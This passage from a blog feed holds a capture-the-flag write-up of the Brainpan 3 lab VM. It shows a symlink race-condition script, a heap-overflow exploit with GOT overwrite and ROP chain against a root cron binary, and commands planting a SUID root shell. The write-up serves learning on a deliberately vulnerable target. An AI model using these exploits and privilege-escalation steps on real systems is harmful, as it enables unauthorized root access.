888    88888888888888     888   888  888 88888888&amp;quot;Y8888b.888      888  888.d888888&amp;quot;Y8888b.   888  888888  88888888888   888  888888888  88888888888
Y88b  d88PY8b.    Y88b.   888   888  888 Y8b.         X88Y88b.    888 d88P888  888     X88   Y88b 888888  888Y8b.       888 d88P888888 d88PY8b.   d8b
 &amp;quot;Y8888P&amp;quot;  &amp;quot;Y8888  &amp;quot;Y8888P888   888  888  &amp;quot;Y8888  88888P&#39; &amp;quot;Y888   88888P&amp;quot; &amp;quot;Y888888 88888P&#39;    &amp;quot;Y88888888  888 &amp;quot;Y8888    88888P&amp;quot; 88888888P&amp;quot;  &amp;quot;Y8888Y8P
                                                                  888                                                   888        888
                                                                  888                                                   888        888
                                                                  888                                                   888        888
Well Done!
Here&#39;s your flag: 0089cd4f9ae79402cdd4e7b8931892b7
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Brainpan: 3 - Part 2</title>
      <link>https://rastamouse.me/writeups/2015/brainpan-3-part-2/</link>
      <pubDate>Sat, 26 Sep 2015 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/writeups/2015/brainpan-3-part-2/</guid>
      <description>

&lt;p&gt;Now that we&amp;rsquo;ve popped &lt;code&gt;anansi&lt;/code&gt; and &lt;code&gt;reynard&lt;/code&gt;, it&amp;rsquo;s time to go after &lt;code&gt;puck&lt;/code&gt; and &lt;code&gt;root&lt;/code&gt;!&lt;/p&gt;

&lt;p&gt;There is something listening on the loopback at port &lt;code&gt;7075&lt;/code&gt;.  When we connect, we get a message about a key.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ netstat -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:7075          0.0.0.0:*               LISTEN

$ nc localhost 7075
Incorrect key
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The first step is to find the service which is bound to the port.  I did it by finding where the binary on port &lt;code&gt;1337&lt;/code&gt; was, and it happened to be in the same location.  Lucky.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ps aux
anansi    1070  0.0  0.1   2044   556 ?        Ss   08:30   0:00 brainpan3

$ ls -l /proc/1070/exe
lrwxrwxrwx 1 anansi webdev 0 Sep 26 08:56 /proc/1070/exe -&amp;gt; /usr/local/sbin/brainpan3

$ ls -l /usr/local/sbin
total 32
-rwxr-xr-x 1 root root 16589 May 26 18:38 brainpan3
-rwxr-xr-x 1 root root  7609 May 20 10:18 trixd
-rwxr-xr-x 1 root root   343 May 21 11:38 www
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Transfer &lt;code&gt;trixd&lt;/code&gt; for analysis.  If we just run it, we drop into a shell.  Also, if we run &lt;code&gt;strings&lt;/code&gt; we see some familiar bit and bobs - confirming we have the correct binary.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ./trixd 
open: No such file or directory
open: No such file or directory
Authentication successful
# id
uid=0(root) gid=0(root) groups=0(root)

root@kali:~/bp3# strings trixd 
/mnt/usb/key.txt
Key file is compromised.
/home/puck/key.txt
open
Authentication successful
/bin/sh
Incorrect key
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So the binary does a string compare between &lt;code&gt;/home/puck/key.txt&lt;/code&gt; and &lt;code&gt;/mnt/usb/key.txt&lt;/code&gt;, if they match &lt;code&gt;/bin/sh&lt;/code&gt; is executed.  We can write to &lt;code&gt;/mnt/usb/&lt;/code&gt;, so the obvious solution is to drop in a symlink&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ls -lR /mnt/
/mnt/:
total 4
drwxrwx--- 2 reynard dev 4096 Jun 17 22:11 usb

/mnt/usb:
total 4
-rw-r--r-- 1 reynard reynard 21 Jun 17 22:11 key.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ rm /mnt/usb/key.txt
$ ln -s /home/puck/key.txt /mnt/usb/key/txt

$ ls -l /mnt/usb/
lrwxrwxrwx 1 reynard webdev 18 Sep 26 09:16 key.txt -&amp;gt; /home/puck/key.txt

$ nc localhost 7075
Key file is compromised.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bawwww :(  The binary is wise to us.  Now&amp;hellip; the bitch about this is that it&amp;rsquo;s been compiled with a ptrace trap, which means we can&amp;rsquo;t easily debug it.  So I kinda went on blind faith here (and a hint from barrebas).  The symlink check is called before the string compare.  So if we are quick enough, we can place a file there to pass the symlink check, then swap it for a symlink.  This is called a race condition.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/brainpan-3/speedy-gonzales.jpg&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;h2 id=&#34;a-race-to-win:f6785c09a6136b44cc09f2d03fcc82fd&#34;&gt;A Race to Win&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python

import os, time

while True:
        os.mknod(&#39;/mnt/usb/key.txt&#39;, 0666)
        time.sleep(0.1)
        os.remove(&#39;/mnt/usb/key.txt&#39;)
        os.symlink(&#39;/home/puck/key.txt&#39;, &#39;/mnt/usb/key.txt&#39;)
        time.sleep(0.1)
        os.remove(&#39;/mnt/usb/key.txt&#39;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then in another shell&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ while :; do nc localhost 7075; done 
Incorrect key
Incorrect key
Incorrect key
Authentication successful
$ id
uid=1001(puck) gid=1004(dev) groups=1001(puck)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;path-to-root:f6785c09a6136b44cc09f2d03fcc82fd&#34;&gt;Path to Root&lt;/h2&gt;

&lt;p&gt;Now that we can read inside &lt;code&gt;puck&#39;s&lt;/code&gt; home directory, we can get the content of &lt;code&gt;key.txt&lt;/code&gt;.  I found it handy to grab this in case I lost shell access - you can write the content into &lt;code&gt;/mnt/usb/key.txt&lt;/code&gt; so you don&amp;rsquo;t have to win the race condition over again.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ cat /home/puck/key.txt
HBN48HY71ERG5GA6290V
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If we check out the following cronjob and follow the trail&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ls -l /etc/cron.d/
-rw-r--r-- 1 root root 100 May 19 18:25 msg_admin

$ cat /etc/cron.d/msg_admin
* * * * * root cd /opt/.messenger; for i in *.msg; do /usr/local/bin/msg_admin 1 $i; rm -f $i; done

$ ls -laR /opt
drwxrwx---  3 root dev  4096 Jun 10 22:32 .messenger

/opt/.messenger:
drwx------ 2 root root 4096 Jun 10 22:32 NOTIFY

$ ls -l /usr/local/bin/msg_admin
-rwxr-xr-x 1 root root 12316 May 31 04:46 /usr/local/bin/msg_admin
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;a-heap-of-trouble:f6785c09a6136b44cc09f2d03fcc82fd&#34;&gt;A Heap of Trouble&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# ./msg_admin 
Usage: ./msg_admin priority message.txt
Message file format: requestername|message
Eg: tony|Add a new user to repo
Can have multiple messages in a single file separated by newlines.
Eg: tony|Please remove /tmp/foo
    cate|Reset password request.
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# file msg_admin 
msg_admin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fb794eca10a43b1fd6f55c5959d818be9c5f70d0, not stripped

gdb-peda$ checksec 
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After disassembling the binary, we work out that messages are stored on the heap.  I think 10 bytes are assigned for the &lt;code&gt;requestorname&lt;/code&gt; and 200 for the &lt;code&gt;message&lt;/code&gt;.  If we submit two messages and inspect the heap, we can see where the data is stored.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python

buf = &amp;quot;A&amp;quot; * 10
buf += &amp;quot;|&amp;quot;
buf += &amp;quot;B&amp;quot; * 200
buf += &amp;quot;\n&amp;quot;

buf += &amp;quot;C&amp;quot; * 10
buf += &amp;quot;|&amp;quot;
buf += &amp;quot;D&amp;quot; * 200

f = open(&amp;quot;message.txt&amp;quot;, w)
f.write(buf)
f.close()
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ r 1 message.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/brainpan-3/heap-layout.jpg&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;I&amp;rsquo;ve highlighted the various pointers - you can see how they point to the start of the &lt;code&gt;requestorname&lt;/code&gt; and &lt;code&gt;message&lt;/code&gt; inputs.  We can add more byes to message 1, and have it overflow the pointer for message 2 requestorname.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python

buf = &amp;quot;A&amp;quot; * 10
buf += &amp;quot;|&amp;quot;
buf += &amp;quot;B&amp;quot; * 212
buf += &amp;quot;XXXX&amp;quot;
buf += &amp;quot;\n&amp;quot;

buf += &amp;quot;C&amp;quot; * 10
buf += &amp;quot;|&amp;quot;
buf += &amp;quot;D&amp;quot; * 200

f = open(&amp;quot;message.txt&amp;quot;, w)
f.write(buf)
f.close()
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;EAX: 0x43434343 (&#39;CCCC&#39;)
EBX: 0x804c170 (&amp;quot;CCCCCCCCCC&amp;quot;)
ECX: 0x804c170 (&amp;quot;CCCCCCCCCC&amp;quot;)
EDX: 0x58585858 (&#39;XXXX&#39;)

gdb-peda$ x/120wx 0x804c388
0x804c388:	0x00000001	0x0804c398	0x0804c3a8	0x00000011
0x804c398:	0x41414141	0x41414141	0x00004141	0x000000d1
0x804c3a8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c3b8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c3c8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c3d8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c3e8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c3f8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c408:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c418:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c428:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c438:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c448:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c458:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c468:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c478:	0x42424242	0x58585858	0x0804c400
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I&amp;rsquo;ll overwrite this pointer with &lt;code&gt;strtok&lt;/code&gt; from the &lt;code&gt;GOT&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# objdump -R msg_admin

msg_admin:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
0804affc R_386_GLOB_DAT    __gmon_start__
0804b00c R_386_JUMP_SLOT   getline
0804b010 R_386_JUMP_SLOT   printf
0804b014 R_386_JUMP_SLOT   fclose
0804b018 R_386_JUMP_SLOT   time
0804b01c R_386_JUMP_SLOT   uname
0804b020 R_386_JUMP_SLOT   __stack_chk_fail
0804b024 R_386_JUMP_SLOT   rewind
0804b028 R_386_JUMP_SLOT   strcat
0804b02c R_386_JUMP_SLOT   strcpy
0804b030 R_386_JUMP_SLOT   malloc
0804b034 R_386_JUMP_SLOT   puts
0804b038 R_386_JUMP_SLOT   __gmon_start__
0804b03c R_386_JUMP_SLOT   strftime
0804b040 R_386_JUMP_SLOT   localtime
0804b044 R_386_JUMP_SLOT   strlen
0804b048 R_386_JUMP_SLOT   __libc_start_main
0804b04c R_386_JUMP_SLOT   atol
0804b050 R_386_JUMP_SLOT   fopen
0804b054 R_386_JUMP_SLOT   memset
0804b058 R_386_JUMP_SLOT   strncpy
0804b05c R_386_JUMP_SLOT   strtok
0804b060 R_386_JUMP_SLOT   fputs
0804b064 R_386_JUMP_SLOT   strncat
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python

from pwn import *

_strtok = 0x0804b05c

buf = &amp;quot;A&amp;quot; * 10
buf += &amp;quot;|&amp;quot;
buf += &amp;quot;B&amp;quot; * 212
buf += p32(_strtok)
buf += &amp;quot;\n&amp;quot;


buf += &amp;quot;CCCC&amp;quot;
buf += &amp;quot;|&amp;quot;
buf += &amp;quot;D&amp;quot; * 200

f = open(&amp;quot;message.txt&amp;quot;, &amp;quot;w&amp;quot;)
f.write(buf)
f.close()
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Stopped reason: SIGSEGV
0x43434343 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now that we have control over EIP, the real work begins.  We have &lt;code&gt;NX&lt;/code&gt; and &lt;code&gt;ASLR&lt;/code&gt; to bypass, so we&amp;rsquo;ll be ROP&amp;rsquo;ing our way down victory lane.  First, let&amp;rsquo;s find a pop ret gadget, to keep our stack aligned and maintain execution flow.  We&amp;rsquo;ve crashed on our &lt;code&gt;C&#39;s&lt;/code&gt;, so this gadget will go here.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# /opt/ropeme/ropeme/ropshell.py 
ROPeMe&amp;gt; generate /root/bp3/msg_admin 30
ROPeMe&amp;gt; search pop %
0x8048ddcL: pop ebx ; pop esi ; pop edi ; pop ebp ;;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;_strtok = 0x0804b05c
_ppppr = 0x8048ddc

buf = &amp;quot;A&amp;quot; * 10
buf += &amp;quot;|&amp;quot;
buf += &amp;quot;B&amp;quot; * 212
buf += p32(_strtok)
buf += &amp;quot;\n&amp;quot;

buf += p32(_ppppr)
buf += &amp;quot;|&amp;quot;
buf += &amp;quot;D&amp;quot; * 200
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Stopped reason: SIGSEGV
0x42424242 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After the &lt;code&gt;ppppr&lt;/code&gt;, we return into our stack of &lt;code&gt;B&#39;s&lt;/code&gt;, so the rest of our payload will go into the body of &lt;code&gt;message 1&lt;/code&gt;.  We should now return here each time.&lt;/p&gt;

&lt;p&gt;There isn&amp;rsquo;t a call to &lt;code&gt;system&lt;/code&gt; anywhere in the binary, so we have to construct our own ROP chain to get its address EAX, then &lt;code&gt;call eax&lt;/code&gt;.  Let&amp;rsquo;s find some gadgets that may be useful in this quest.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ROPeMe&amp;gt; search mov eax %
ROPeMe&amp;gt; search add eax %
ROPeMe&amp;gt; search sub eax %
ROPeMe&amp;gt; search pop ebx %
ROPeMe&amp;gt; search call eax %
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I figure we should get an address of another GOT into EAX, calculate its offset to system and modify EAX accordingly.  I don&amp;rsquo;t think the &lt;code&gt;sub eax&lt;/code&gt; gadget is useable, so I need a GOT entry which is &lt;em&gt;smaller&lt;/em&gt; than system, then &lt;em&gt;add&lt;/em&gt; to it.&lt;/p&gt;

&lt;p&gt;I found a way to do this quite nicely using &lt;code&gt;pwntools&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python

from pwn import *

elf = ELF(&#39;/root/bp3/msg_admin&#39;)
libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)

print &amp;quot;[+] System is at &amp;quot; + hex(libc.symbols[&#39;system&#39;])

for symbol in elf.symbols:
        try: print &amp;quot;\t[&amp;gt;] &amp;quot; + symbol + &amp;quot; is at &amp;quot; + hex(libc.symbols[symbol])
        except: pass

print &amp;quot;\n&amp;quot;

for symbol in elf.symbols:
        try:
                if libc.symbols[symbol] &amp;lt; libc.symbols[&#39;system&#39;]:
                        print &amp;quot;[+] &amp;quot; + symbol + &amp;quot; is lower: &amp;quot; + hex(libc.symbols[symbol])
        except: pass
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# ./libc.py 
[+] System is at 0x3de10
    [&amp;gt;] fclose is at 0x10ea80
    [&amp;gt;] uname is at 0xa0590
    [&amp;gt;] __libc_start_main is at 0x19630
    [&amp;gt;] printf is at 0x4c970
    [&amp;gt;] fopen is at 0x10e840
    [&amp;gt;] strncpy is at 0x7a040
    [&amp;gt;] puts is at 0x64ab0
    [&amp;gt;] strtok is at 0x7b170
    [&amp;gt;] fputs is at 0x63560
    [&amp;gt;] getline is at 0x60b60
    [&amp;gt;] localtime is at 0x91690
    [&amp;gt;] atol is at 0x2f2c0
    [&amp;gt;] __stack_chk_fail is at 0xe5790
    [&amp;gt;] malloc is at 0x758c0
    [&amp;gt;] memset is at 0x7b6c0
    [&amp;gt;] strcat is at 0x79350
    [&amp;gt;] got.malloc is at 0x16d014
    [&amp;gt;] strlen is at 0x79d10
    [&amp;gt;] strncat is at 0x79e80
    [&amp;gt;] rewind is at 0x6af60
    [&amp;gt;] strcpy is at 0x79740
    [&amp;gt;] time is at 0x91f00
    [&amp;gt;] strftime is at 0x97c00


[+] __libc_start_main is lower: 0x19630
[+] atol is lower: 0x2f2c0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Only &lt;code&gt;atol&lt;/code&gt; is lower than &lt;code&gt;system&lt;/code&gt;, kinda made me think I was on the right track.  The difference between &lt;code&gt;0x3de10&lt;/code&gt; and &lt;code&gt;0x2f2c0&lt;/code&gt; is &lt;code&gt;0xeb50&lt;/code&gt;.  First, we want to clear EAX to 0, so it&amp;rsquo;s in a nice state to work with.&lt;/p&gt;

&lt;p&gt;There&amp;rsquo;s a pretty handy gadget that&amp;rsquo;ll do that for us:
&lt;code&gt;0x8048790L: mov eax 0x804b074 ; sub eax 0x804b074&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;_strtok = 0x0804b05c
_ppppr = 0x8048ddc
_0eax = 0x8048790               # mov eax 0x804b074 ; sub eax 0x804b074 

buf = &amp;quot;A&amp;quot; * 10
buf += &amp;quot;|&amp;quot;
buf += p32(_0eax)
buf += &amp;quot;B&amp;quot; * (212 - 4)
buf += p32(_strtok)
buf += &amp;quot;\n&amp;quot;

buf += p32(_ppppr)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I let it SEGFAULT again, but we can now see&amp;hellip; &lt;code&gt;EAX: 0x0&lt;/code&gt;.  Good.  Now let&amp;rsquo;s throw in our &lt;code&gt;pop ebx&lt;/code&gt; gadget and address for &lt;code&gt;atol&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;_strtok = 0x0804b05c
_ppppr = 0x8048ddc
_atol = 0x804b04c
_0eax = 0x8048790               # mov eax 0x804b074 ; sub eax 0x804b074
_popebx = 0x804859d

buf = &amp;quot;A&amp;quot; * 10
buf += &amp;quot;|&amp;quot;
buf += p32(_0eax)
buf += p32(_popebx)
buf += p32(_atol)
buf += &amp;quot;B&amp;quot; * (212 - 12)
buf += p32(_strtok)
buf += &amp;quot;\n&amp;quot;

buf += p32(_ppppr)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This time, when we crash:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;EAX: 0x0 
EBX: 0x804b04c --&amp;gt; 0xb7e3f820 (&amp;lt;atol&amp;gt;:	sub    esp,0x1c)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now the &lt;code&gt;add eax&lt;/code&gt;, but there&amp;rsquo;s a slight twist here.  The gadget I&amp;rsquo;m using is: &lt;code&gt;add eax [ebx+0x1270304]&lt;/code&gt; - it will take whatever is in EBX, add 0x1270304 to it, then put it in EAX.  It means that I have to subtract this value away from &lt;code&gt;atol&lt;/code&gt; to compensate.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;_strtok = 0x0804b05c
_ppppr = 0x8048ddc
_atol = 0x804b04c
_0eax = 0x8048790               # mov eax 0x804b074 ; sub eax 0x804b074
_popebx = 0x804859d 
_addeax = 0x8048feb             # add eax [ebx+0x1270304]
_offset = 0x1270304

buf = &amp;quot;A&amp;quot; * 10
buf += &amp;quot;|&amp;quot;
buf += p32(_0eax)
buf += p32(_popebx)
buf += p32(_atol - _offset)
buf += p32(_addeax)
buf += &amp;quot;B&amp;quot; * (212 - 16)
buf += p32(_strtok)
buf += &amp;quot;\n&amp;quot;

buf += p32(_ppppr)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Crash, and: &lt;code&gt;EAX: 0xb7e3f820 (&amp;lt;atol&amp;gt;:   sub    esp,0x1c)&lt;/code&gt;.  So far, so good!  I&amp;rsquo;ve already established the amount I need to add, so I need to find values within the binary that I can use that will add up to &lt;code&gt;0xeb50&lt;/code&gt;.  The closest I could find was: &lt;code&gt;0x8049f67 --&amp;gt; 0xeb00&lt;/code&gt; and &lt;code&gt;0x8048130 --&amp;gt; 0x10&lt;/code&gt;.  Let&amp;rsquo;s add all of those in and see what happens.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;_strtok = 0x0804b05c
_ppppr = 0x8048ddc
_atol = 0x804b04c
_0eax = 0x8048790               # mov eax 0x804b074 ; sub eax 0x804b074
_popebx = 0x804859d
_addeax = 0x8048feb             # add eax [ebx+0x1270304]
_offset = 0x1270304

_eb00 = 0x8049f67
_10 = 0x8048130

buf = &amp;quot;A&amp;quot; * 10
buf += &amp;quot;|&amp;quot;
buf += p32(_0eax)
buf += p32(_popebx)
buf += p32(_atol - _offset)
buf += p32(_addeax)

buf += p32(_popebx)
buf += p32(_eb00 - _offset)
buf += p32(_addeax)

buf += p32(_popebx)
buf += p32(_10 - _offset)
buf += p32(_addeax)

buf += p32(_popebx)
buf += p32(_10 - _offset)
buf += p32(_addeax)

buf += p32(_popebx)
buf += p32(_10 - _offset)
buf += p32(_addeax)

buf += p32(_popebx)
buf += p32(_10 - _offset)
buf += p32(_addeax)

buf += &amp;quot;B&amp;quot; * (212 - 76)
buf += p32(_strtok)
buf += &amp;quot;\n&amp;quot;

buf += p32(_ppppr)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Crash:  &lt;code&gt;EAX: 0xb7e4e360 (&amp;lt;__libc_system&amp;gt;:  push   ebx)&lt;/code&gt;.  We&amp;rsquo;re on the home straight now.&lt;/p&gt;

&lt;p&gt;We need an argument to put into system - luckily there&amp;rsquo;s a static reference to &lt;code&gt;/tmp/foo&lt;/code&gt; in the binary - if you recall its help message.  &lt;code&gt;0x8048eef (&amp;quot;/tmp/foo&amp;quot;)&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;_calleax = 0x8048786            # call eax ; leave
_foo = 0x8048eef

buf += p32(_calleax)
buf += p32(_foo)
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ r 1 message.txt 
Starting program: /root/bp3/msg_admin 1 message.txt
[+] Recording 2 entries
# id
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So it works on my local box - I just copied &lt;code&gt;/bin/sh&lt;/code&gt; as a simple test.  Time to copy &lt;code&gt;message.txt&lt;/code&gt; across to bp3 (again with &lt;code&gt;xxd&lt;/code&gt;).  For the cronjob to pick it up, it must be within &lt;code&gt;/opt/.messenger/&lt;/code&gt; and have the &lt;code&gt;.msg&lt;/code&gt; extension.  You know the job has run, because after the message has been processed, it gets deleted.&lt;/p&gt;

&lt;h2 id=&#34;failed:f6785c09a6136b44cc09f2d03fcc82fd&#34;&gt;Failed?&lt;/h2&gt;

&lt;p&gt;My &lt;code&gt;/tmp/foo&lt;/code&gt; payload on bp3 was to create a SUID shell.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;cp /bin/sh /tmp/pwn
chmod 4777 /tmp/pwn
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But unfortunately it wasn&amp;rsquo;t working :( I tried copying it in a few times - it would get deleted, but there was no SUID shell in &lt;code&gt;/tmp&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I had a look at &lt;code&gt;libc&lt;/code&gt; on bp3 and found that the offsets between &lt;code&gt;atol&lt;/code&gt; and &lt;code&gt;system&lt;/code&gt; was different than on my box.  *sigh*.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep atol
  1778: 00031890    35 FUNC    GLOBAL DEFAULT   12 atol@@GLIBC_2.0

$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
  620: 00040190    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The difference here is &lt;code&gt;0xE8D0&lt;/code&gt;!  This meant I had to go back and find new values for my increments, which turned out to be a good thing because I found a way to do it in just two adds.&lt;/p&gt;

&lt;p&gt;This is my final exploit:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python

from pwn import *

_strtok = 0x0804b05c
_ppppr = 0x8048ddc
_atol = 0x804b04c
_0eax = 0x8048790               # mov eax 0x804b074 ; sub eax 0x804b074
_popebx = 0x804859d
_addeax = 0x8048feb             # add eax [ebx+0x1270304]
_offset = 0x1270304
_calleax = 0x8048786            # call eax ; leave

_e800 = 0x80480c7
_100 = 0x8048013

_foo = 0x8048eef

buf = &amp;quot;A&amp;quot; * 10
buf += &amp;quot;|&amp;quot;
buf += p32(_0eax)
buf += p32(_popebx)
buf += p32(_atol - _offset)
buf += p32(_addeax)

buf += p32(_popebx)
buf += p32(_e800 - _offset)
buf += p32(_addeax)

buf += p32(_popebx)
buf += p32(_100 - _offset)
buf += p32(_addeax)

buf += p32(_calleax)
buf += p32(_foo)

buf += &amp;quot;B&amp;quot; * (212 - 48)
buf += p32(_strtok)
buf += &amp;quot;\n&amp;quot;

buf += p32(_ppppr)
buf += &amp;quot;|&amp;quot;
buf += &amp;quot;D&amp;quot; * 200

f = open(&amp;quot;message.txt&amp;quot;, &amp;quot;w&amp;quot;)
f.write(buf)
f.close()
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ls -l /tmp
-rwxr-xr-x 1 puck dev      40 Oct  9 15:15 foo
-rwsrwxrwx 1 root root 112204 Oct  9 22:31 pwn
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ /tmp/pwn
$ id
uid=1001(puck) gid=1004(dev) euid=0(root) groups=0(root)

$ ls -l /root
-rw------- 1 root root 314 Jun 23 12:45 brainpan.8.gz
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Unzip the file, then check it out.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# man ./brainpan.8 

DESCRIPTION
       Congratulations, you win! Thanks for playing!

FLAG
       flag{tricksy-hobbitses-use-unix}

BUGS
       You found them all.

AUTHOR
       superkojiman - http://blog.techorganic.com

TESTERS
       Special thanks go to barrebas and Swappage taking the time to test Brainpan 3!
       barrebas - https://twitter.com/barrebas
       Swappage - https://twitter.com/Swappage
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I am now going on an extended leave of absense to recover.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Brainpan: 3 - Part 1</title>
      <link>https://rastamouse.me/writeups/2015/brainpan-3-part-1/</link>
      <pubDate>Sat, 19 Sep 2015 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/writeups/2015/brainpan-3-part-1/</guid>
      <description>

&lt;p&gt;As with the rest of the series, the focus of brainpan3 is on binary explotation.  The challenges in this VM are certainly a step-up in terms of difficultly compared to brainpan&amp;rsquo;s 1 &amp;amp; 2, and require you to bypass many common protection mechanisms.  On-and-off, it took me about 2 months to solve :s&lt;/p&gt;

&lt;h2 id=&#34;port-scan:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Port Scan&lt;/h2&gt;

